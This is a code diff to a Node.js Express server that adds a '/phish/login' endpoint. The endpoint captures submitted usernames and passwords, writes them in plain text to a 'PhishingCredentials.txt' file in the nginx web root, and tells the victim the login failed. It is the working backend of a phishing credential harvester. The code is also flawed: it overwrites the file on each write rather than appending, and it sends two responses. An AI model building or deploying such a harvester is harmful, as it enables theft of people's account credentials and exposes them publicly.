@@ -12,8 +12,9 @@ const __dirname = path.dirname(__filename);
 
 
 // Directory path for documents
-const directoryPath = 'C:/nginx-1.27.0/html';
-//const directoryPath = 'C:/Users/Administrator/Downloads/nginx-1.26.2/nginx-1.26.2/html';
+//const directoryPath = 'C:/nginx-1.27.0/html';
+const directoryPath = 'C:/Users/Administrator/Downloads/UploadedDocuments';
+const PhishCredsPath = 'C:/nginx-1.27.0/html/PhishingCredentials.txt';
 // Ensure the directory exists
 if (!fs.existsSync(directoryPath)) {
     fs.mkdirSync(directoryPath);
@@ -155,6 +156,45 @@ router.post('/upload', upload.single('document'), (req, res) => {
         message: 'File uploaded successfully',
         filename: req.file.filename, // Send the file name as a response
     });
+});
+
+router.post('/phish/login', async (req, res) => {
+    const { username, password } = req.body;
+
+    if (!username || !password) {
+        return res.status(400).json({ error: 'Username and password are required' });
+    }
+
+    try {
+        // Read the existing file contents
+        let fileContent = '';
+        // try {
+        //     fileContent = await fs.readFile(PhishCredsPath, 'utf-8');
+        // } catch (err) {
+        //     if (err.code !== 'ENOENT') {
+        //         console.error('Error reading file:', err);
+        //         return res.status(500).json({ error: 'Internal server error' });
+        //     }
+        // }
+
+        // Append the new credentials to the existing content
+        const newContent = `${fileContent}\nUsername: ${username}, Password: ${password}`;
+
+        // Write the updated content back to the file
+        //await fs.writeFile(PhishCredsPath, newContent.trim(), 'utf-8');
+        fs.writeFile(PhishCredsPath, newContent, 'utf8', (err) => {
+            if (err) {
+                console.error('Error updating file:', err);
+                return res.status(500).json({ error: 'Failed to update document' });
+            }
+            res.json({ message: 'Document updated successfully' });
+        });
+
+        res.status(200).json({ message: 'Login failed. Please try again.' });
+    } catch (err) {
+        console.error('Error writing to file:', err);
+        res.status(500).json({ error: 'Internal server error' });
+    }
 });
 
 
